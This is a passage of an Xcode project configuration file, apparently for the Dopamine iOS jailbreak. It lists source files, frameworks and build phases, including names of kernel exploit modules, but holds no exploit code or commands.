		8C2131902B50CA4B008E682C /* libkfd.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = libkfd.h; sourceTree = "<group>"; };
		8C2875202BD850B4008B24DA /* LICENSE_libgrabkernel2.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_libgrabkernel2.md; sourceTree = "<group>"; };
		8C296BAA2BE049E4007C2AD1 /* DOPSExploitListItemsController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOPSExploitListItemsController.h; sourceTree = "<group>"; };
		8C296BAB2BE049E4007C2AD1 /* DOPSExploitListItemsController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOPSExploitListItemsController.m; sourceTree = "<group>"; };
		8C296BAD2BE05914007C2AD1 /* LICENSE_plooshinit.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_plooshinit.md; sourceTree = "<group>"; };
		8C2B1FC72B52FB56009BA166 /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		8C2B1FDF2B532374009BA166 /* dmaFail.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = dmaFail.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		8C2B1FEF2B5324DE009BA166 /* dmaFail.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = dmaFail.h; sourceTree = "<group>"; };
		8C2B1FF12B53251E009BA166 /* dmaFail.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = dmaFail.c; sourceTree = "<group>"; };
		8C2B1FF32B5325A9009BA166 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		8C46D71E2B588875002899DB /* zstd.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = zstd.h; sourceTree = "<group>"; };
		8C46D71F2B588875002899DB /* zstd_errors.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = zstd_errors.h; sourceTree = "<group>"; };
		8C46D7202B588875002899DB /* zdict.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = zdict.h; sourceTree = "<group>"; };
		8C4ABEBC2B52274300B43C9B /* DOPreferenceManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOPreferenceManager.h; sourceTree = "<group>"; };
		8C4ABEBD2B52274300B43C9B /* DOPreferenceManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOPreferenceManager.m; sourceTree = "<group>"; };
		8C512B8B2B5C9DE800C6F14A /* sileo.deb */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; path = sileo.deb; sourceTree = "<group>"; };
		8C512B8C2B5C9DE800C6F14A /* zebra.deb */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; path = zebra.deb; sourceTree = "<group>"; };
		8C56D4B82B7C0DF2001C03D3 /* LICENSE_ChOma.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_ChOma.md; sourceTree = "<group>"; };
		8C56D4B92B7C0DF2001C03D3 /* LICENSE_Fugu15_Rootful.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_Fugu15_Rootful.md; sourceTree = "<group>"; };
		8C56D4BA2B7C0DF2001C03D3 /* LICENSE_dimentio.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_dimentio.md; sourceTree = "<group>"; };
		8C56D4BB2B7C0DF2001C03D3 /* LICENSE_Fugu15.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_Fugu15.md; sourceTree = "<group>"; };
		8C56D4BC2B7C0DF2001C03D3 /* LICENSE_ElleKit.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_ElleKit.md; sourceTree = "<group>"; };
		8C56D4BD2B7C0DF2001C03D3 /* LICENSE_XPF.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_XPF.md; sourceTree = "<group>"; };
		8C56D4BE2B7C0DF2001C03D3 /* LICENSE_opainject.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_opainject.md; sourceTree = "<group>"; };
		8C56D4C62B7C102B001C03D3 /* LICENSE_Sileo.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_Sileo.md; sourceTree = "<group>"; };
		8C56D4C72B7C102B001C03D3 /* LICENSE_Procursus.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_Procursus.md; sourceTree = "<group>"; };
		8C56D4C82B7C102B001C03D3 /* LICENSE_Zebra.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_Zebra.md; sourceTree = "<group>"; };
		8C56D4CC2B7C118B001C03D3 /* LICENSE_kfd.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_kfd.md; sourceTree = "<group>"; };
		8C58E5582B7EAF8000E3ADAA /* CoreServices.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreServices.framework; path = System/Library/Frameworks/CoreServices.framework; sourceTree = SDKROOT; };
		8C5FA8D42BDD36B6008C246F /* weightBufs.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = weightBufs.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		8C5FA8D62BDD36B6008C246F /* weightBufs.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = weightBufs.h; sourceTree = "<group>"; };
		8C5FA8E42BDD36BF008C246F /* multicast_bytecopy.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = multicast_bytecopy.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		8C5FA8E62BDD36BF008C246F /* multicast_bytecopy.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = multicast_bytecopy.h; sourceTree = "<group>"; };
		8C5FA8EF2BDD36F9008C246F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist; path = Info.plist; sourceTree = "<group>"; };
		8C5FA8F02BDD3700008C246F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		8C5FA8F12BDD439A008C246F /* weightBufs.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = weightBufs.m; sourceTree = "<group>"; };
		8C5FA8F32BDD43A9008C246F /* multicast_bytecopy.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = multicast_bytecopy.m; sourceTree = "<group>"; };
		8C5FA8F82BDD47D4008C246F /* iokit.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = iokit.h; sourceTree = "<group>"; };
		8C5FA8F92BDD47D4008C246F /* model_tmp.hwx */ = {isa = PBXFileReference; lastKnownFileType = file; path = model_tmp.hwx; sourceTree = "<group>"; };
		8C5FA8FA2BDD47D4008C246F /* _ANEClient.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEClient.h; sourceTree = "<group>"; };
		8C5FA8FB2BDD47D4008C246F /* _ANECloneHelper.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANECloneHelper.h; sourceTree = "<group>"; };
		8C5FA8FC2BDD47D4008C246F /* _ANEDaemonConnection.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEDaemonConnection.h; sourceTree = "<group>"; };
		8C5FA8FD2BDD47D4008C246F /* _ANEDaemonProtocol.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEDaemonProtocol.h; sourceTree = "<group>"; };
		8C5FA8FE2BDD47D4008C246F /* _ANEDataReporter.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEDataReporter.h; sourceTree = "<group>"; };
		8C5FA8FF2BDD47D4008C246F /* _ANEDeviceController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEDeviceController.h; sourceTree = "<group>"; };
		8C5FA9002BDD47D4008C246F /* _ANEDeviceInfo.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEDeviceInfo.h; sourceTree = "<group>"; };
		8C5FA9012BDD47D4008C246F /* _ANEErrors.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEErrors.h; sourceTree = "<group>"; };
		8C5FA9022BDD47D4008C246F /* _ANEHashEncoding.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEHashEncoding.h; sourceTree = "<group>"; };
		8C5FA9032BDD47D4008C246F /* _ANEIOSurfaceObject.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEIOSurfaceObject.h; sourceTree = "<group>"; };
		8C5FA9042BDD47D4008C246F /* _ANELog.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANELog.h; sourceTree = "<group>"; };
		8C5FA9052BDD47D4008C246F /* _ANEModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEModel.h; sourceTree = "<group>"; };
		8C5FA9062BDD47D4008C246F /* _ANEPerformanceStats.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEPerformanceStats.h; sourceTree = "<group>"; };
		8C5FA9072BDD47D4008C246F /* _ANEProgramForEvaluation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEProgramForEvaluation.h; sourceTree = "<group>"; };
		8C5FA9082BDD47D4008C246F /* _ANEQoSMapper.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEQoSMapper.h; sourceTree = "<group>"; };
		8C5FA9092BDD47D4008C246F /* _ANERequest.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANERequest.h; sourceTree = "<group>"; };
		8C5FA90A2BDD47D4008C246F /* _ANEStrings.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = _ANEStrings.h; sourceTree = "<group>"; };
		8C5FA90B2BDD47D4008C246F /* AppleNeuralEngine-Structs.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "AppleNeuralEngine-Structs.h"; sourceTree = "<group>"; };
		8C5FA90C2BDD47D4008C246F /* AppleNeuralEngine.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AppleNeuralEngine.h; sourceTree = "<group>"; };
		8C5FA90D2BDD47D4008C246F /* NSCopying.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = NSCopying.h; sourceTree = "<group>"; };
		8C5FA90E2BDD47D4008C246F /* NSSecureCoding.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = NSSecureCoding.h; sourceTree = "<group>"; };
		8C5FA9102BDD47D4008C246F /* aneProgram.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = aneProgram.h; sourceTree = "<group>"; };
		8C5FA9112BDD47D4008C246F /* IOSurface.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = IOSurface.c; sourceTree = "<group>"; };
		8C5FA9122BDD47D4008C246F /* exploit.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = exploit.h; sourceTree = "<group>"; };
		8C5FA9132BDD47D4008C246F /* ANEDirectIn.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = ANEDirectIn.h; sourceTree = "<group>"; };
		8C5FA9142BDD47D4008C246F /* exploit.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = exploit.m; sourceTree = "<group>"; };
		8C5FA9152BDD47D4008C246F /* ANEDirectIn.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = ANEDirectIn.c; sourceTree = "<group>"; };
		8C5FA9162BDD47D4008C246F /* IOGPU.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = IOGPU.c; sourceTree = "<group>"; };
		8C5FA9172BDD47D5008C246F /* utils.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = utils.c; sourceTree = "<group>"; };
		8C5FA9182BDD47D5008C246F /* IOSurface.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = IOSurface.h; sourceTree = "<group>"; };
		8C5FA9192BDD47D5008C246F /* IOGPU.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = IOGPU.h; sourceTree = "<group>"; };
		8C5FA93F2BDD5039008C246F /* IOKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = IOKit.framework; path = Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.4.sdk/System/Library/Frameworks/IOKit.framework; sourceTree = DEVELOPER_DIR; };
		8C5FA9412BDD503D008C246F /* IOSurface.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = IOSurface.framework; path = Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.4.sdk/System/Library/Frameworks/IOSurface.framework; sourceTree = DEVELOPER_DIR; };
		8C5FA9432BDD5062008C246F /* CoreML.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreML.framework; path = Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.4.sdk/System/Library/Frameworks/CoreML.framework; sourceTree = DEVELOPER_DIR; };
		8C5FA9462BDD6C0B008C246F /* IOSurfaceRoot.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = IOSurfaceRoot.c; sourceTree = "<group>"; };
		8C5FA9472BDD6C0B008C246F /* mcast.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = mcast.h; sourceTree = "<group>"; };
		8C5FA9482BDD6C0B008C246F /* necp.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = necp.h; sourceTree = "<group>"; };
		8C5FA9492BDD6C0B008C246F /* port_utils.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = port_utils.c; sourceTree = "<group>"; };
		8C5FA94A2BDD6C0B008C246F /* IOSurfaceRoot.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = IOSurfaceRoot.h; sourceTree = "<group>"; };
		8C5FA94B2BDD6C0B008C246F /* necp.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = necp.c; sourceTree = "<group>"; };
		8C5FA94C2BDD6C0B008C246F /* port_utils.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = port_utils.h; sourceTree = "<group>"; };
		8C5FA94D2BDD6C0B008C246F /* kernel_base.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = kernel_base.c; sourceTree = "<group>"; };
		8C5FA94E2BDD6C0B008C246F /* IOGPU.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = IOGPU.h; sourceTree = "<group>"; };
		8C5FA94F2BDD6C0B008C246F /* iokit.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = iokit.h; sourceTree = "<group>"; };
		8C5FA9502BDD6C0B008C246F /* spray.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = spray.h; sourceTree = "<group>"; };
		8C5FA9512BDD6C0B008C246F /* exploit.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = exploit.c; sourceTree = "<group>"; };
		8C5FA9522BDD6C0C008C246F /* mcast.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = mcast.c; sourceTree = "<group>"; };
		8C5FA9532BDD6C0C008C246F /* kernel_rw.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = kernel_rw.c; sourceTree = "<group>"; };
		8C5FA9542BDD6C0C008C246F /* IOGPU.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = IOGPU.c; sourceTree = "<group>"; };
		8C5FA9552BDD6C0C008C246F /* spray.c */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.c; path = spray.c; sourceTree = "<group>"; };
		8C5FA9562BDD6C0C008C246F /* xpaci.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = xpaci.h; sourceTree = "<group>"; };
		8C5FA9572BDD6C0C008C246F /* kernel_base.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = kernel_base.h; sourceTree = "<group>"; };
		8C5FA9582BDD6C0C008C246F /* kernel_rw.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = kernel_rw.h; sourceTree = "<group>"; };
		8C5FA9592BDD6C0C008C246F /* exploit.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = exploit.h; sourceTree = "<group>"; };
		8C5FA9702BDD81EF008C246F /* LICENSE_weightBufs.md */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = net.daringfireball.markdown; path = LICENSE_weightBufs.md; sourceTree = "<group>"; };
		8C609C992C19AC250023DD12 /* libkrw-dopamine.deb */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = "libkrw-dopamine.deb"; path = "../../../Packages/libkrw-provider/libkrw-dopamine.deb"; sourceTree = "<group>"; };
		8C609C9C2C19AECF0023DD12 /* NSString+Version.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "NSString+Version.m"; sourceTree = "<group>"; };
		8C609C9D2C19AEE70023DD12 /* NSString+Version.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "NSString+Version.h"; sourceTree = "<group>"; };
		8C6599DA2C555A60000FF57F /* DOPSJetsamListItemsController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOPSJetsamListItemsController.m; sourceTree = "<group>"; };
		8C6599DC2C555A71000FF57F /* DOPSJetsamListItemsController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOPSJetsamListItemsController.h; sourceTree = "<group>"; };
		8C7198152ABF0E82003C6658 /* Dopamine.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Dopamine.app; sourceTree = BUILT_PRODUCTS_DIR; };
		8C7198182ABF0E82003C6658 /* DOAppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOAppDelegate.h; sourceTree = "<group>"; };
		8C7198192ABF0E82003C6658 /* DOAppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOAppDelegate.m; sourceTree = "<group>"; };
		8C71981B2ABF0E82003C6658 /* DOSceneDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DOSceneDelegate.h; sourceTree = "<group>"; };
		8C71981C2ABF0E82003C6658 /* DOSceneDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = DOSceneDelegate.m; sourceTree = "<group>"; };
		8C7198242ABF0E84003C6658 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		8C7198272ABF0E84003C6658 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		8C7198292ABF0E84003C6658 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		8C71982A2ABF0E84003C6658 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
		8C9E46272ACA1C8D00B5456A /* UIImage+Blur.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "UIImage+Blur.h"; sourceTree = "<group>"; };
		8C9E46282ACA1CC700B5456A /* UIImage+Blur.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "UIImage+Blur.m"; sourceTree = "<group>"; };
		8CB94F022B59E17A0098BAFD /* basebin.tc */ = {isa = PBXFileReference; lastKnownFileType = file; name = basebin.tc; path = ../../../BaseBin/basebin.tc; sourceTree = "<group>"; };
		8CB94F032B59E17A0098BAFD /* basebin.tar */ = {isa = PBXFileReference; lastKnownFileType = archive.tar; name = basebin.tar; path = ../../../BaseBin/basebin.tar; sourceTree = "<group>"; };
		8CBF1A482EC3B71700EB2308 /* UIImage+JPEG2000.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "UIImage+JPEG2000.h"; sourceTree = "<group>"; };
		8CBF1A492EC3B71700EB2308 /* UIImage+JPEG2000.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "UIImage+JPEG2000.m"; sourceTree = "<group>"; };
		8CC139802B53DE6C00230143 /* NSData+Hex.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NSData+Hex.h"; sourceTree = "<group>"; };
		8CC139812B53DE6C00230143 /* NSData+Hex.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "NSData+Hex.m"; sourceTree = "<group>"; };
		8CCD2FC32B77AA9200F9C5DA /* basebin-link.deb */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = "basebin-link.deb"; path = "../../../Packages/basebin-link/basebin-link.deb"; sourceTree = "<group>"; };
		8CCD8A832B6F165A004B72B0 /* libroot.deb */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libroot.deb; path = ../../../Packages/libroot/libroot.deb; sourceTree = "<group>"; };
		8CDD07A72B4F619000A32B61 /* kfd.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = kfd.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		8CDD07A92B4F619000A32B61 /* kfd.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = kfd.h; sourceTree = "<group>"; };
		8CDD07B32B4F639100A32B61 /* kfd.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = kfd.m; sourceTree = "<group>"; };
		8CDD08352B4F682000A32B61 /* IOSurface.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = IOSurface.framework; path = Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk/System/Library/Frameworks/IOSurface.framework; sourceTree = DEVELOPER_DIR; };
		8CDD08372B4F682500A32B61 /* IOKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = IOKit.framework; path = Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk/System/Library/Frameworks/IOKit.framework; sourceTree = DEVELOPER_DIR; };
		8CDD083B2B4F6D8200A32B61 /* libgrabkernel2.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libgrabkernel2.a; path = Dopamine/Dependencies/libgrabkernel2.a; sourceTree = "<group>"; };
		8CDD08422B4F6DD800A32B61 /* libjailbreak.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libjailbreak.dylib; path = ../BaseBin/.build/libjailbreak.dylib; sourceTree = "<group>"; };
		8CDD08432B4F6DD800A32B61 /* libchoma.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libchoma.dylib; path = ../BaseBin/.build/libchoma.dylib; sourceTree = "<group>"; };
		8CDD08442B4F6DD800A32B61 /* libxpf.dylib */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = libxpf.dylib; path = ../BaseBin/.build/libxpf.dylib; sourceTree = "<group>"; };
		C075B0CB2B8F2BCE009A26BB /* th */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = th; path = th.lproj/Localizable.strings; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		8C05B0002B63152B001A7CF3 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C05B00F2B631532001A7CF3 /* libjailbreak.dylib in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C2B1FDC2B532374009BA166 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C2B1FEA2B53238D009BA166 /* libjailbreak.dylib in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C5FA8D12BDD36B6008C246F /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C5FA9422BDD503D008C246F /* IOSurface.framework in Frameworks */,
				8C5FA93B2BDD4F98008C246F /* libjailbreak.dylib in Frameworks */,
				8C5FA9442BDD5062008C246F /* CoreML.framework in Frameworks */,
				8C5FA9402BDD5039008C246F /* IOKit.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C5FA8E12BDD36BF008C246F /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C5FA96F2BDD789C008C246F /* IOSurface.framework in Frameworks */,
				8C5FA96E2BDD7898008C246F /* IOKit.framework in Frameworks */,
				8C5FA93C2BDD4F9D008C246F /* libjailbreak.dylib in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C7198122ABF0E82003C6658 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C029F6B2B4E320E0071DE58 /* libz.tbd in Frameworks */,
				8CDD08472B4F6DD800A32B61 /* libxpf.dylib in Frameworks */,
				8CDD08462B4F6DD800A32B61 /* libchoma.dylib in Frameworks */,
				8CC139832B53E05300230143 /* IOKit.framework in Frameworks */,
				8C029F682B4E31D50071DE58 /* libMobileGestalt.tbd in Frameworks */,
				8C46D7252B588973002899DB /* libzstd in Frameworks */,
				8CDD08412B4F6D8700A32B61 /* libgrabkernel2.a in Frameworks */,
				51F19D052BBF456200896361 /* libpartial.a in Frameworks */,
				042479E52B66B0DD0082581B /* Preferences.framework in Frameworks */,
				8C029F662B4E2E970071DE58 /* libcompression.tbd in Frameworks */,
				8C58E5592B7EAF8000E3ADAA /* CoreServices.framework in Frameworks */,
				8C4ABEB62B52094100B43C9B /* libjailbreak.dylib in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8CDD07A42B4F619000A32B61 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8CDD08362B4F682000A32B61 /* IOSurface.framework in Frameworks */,
				8CDD08382B4F682500A32B61 /* IOKit.framework in Frameworks */,
				8C4ABEB92B520E7B00B43C9B /* libjailbreak.dylib in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		042479672B66916B0082581B /* UI */ = {
			isa = PBXGroup;
			children = (
				04DD0B412B7CBE100055DE4F /* Themes */,
				04C246A22B74ABD600E17924 /* PkgManagers */,
				042479792B66916B0082581B /* Transition */,
				042479692B66916B0082581B /* Settings */,
				0424798A2B66916B0082581B /* Log */,
				042479992B66916B0082581B /* ActionMenu */,
				04C246972B73220400E17924 /* Update */,
				042479812B66916B0082581B /* DOUIManager.h */,
				042479882B66916B0082581B /* DOUIManager.m */,
				042479802B66916B0082581B /* DONavigationController.h */,
				042479892B66916B0082581B /* DONavigationController.m */,
				042479842B66916B0082581B /* DOMainViewController.h */,
				0424799F2B66916B0082581B /* DOMainViewController.m */,
				042479682B66916B0082581B /* DOJailbreakButton.h */,
				042479862B66916B0082581B /* DOJailbreakButton.m */,
				042479822B66916B0082581B /* DOHeaderView.h */,
				042479872B66916B0082581B /* DOHeaderView.m */,
				042479832B66916B0082581B /* DOGlobalAppearance.h */,
				042479A02B66916B0082581B /* DOGlobalAppearance.m */,
			);
			path = UI;
			sourceTree = "<group>";
		};
		042479692B66916B0082581B /* Settings */ = {
			isa = PBXGroup;
			children = (
				0443A9AE2B79D9A40014C933 /* PSLists */,
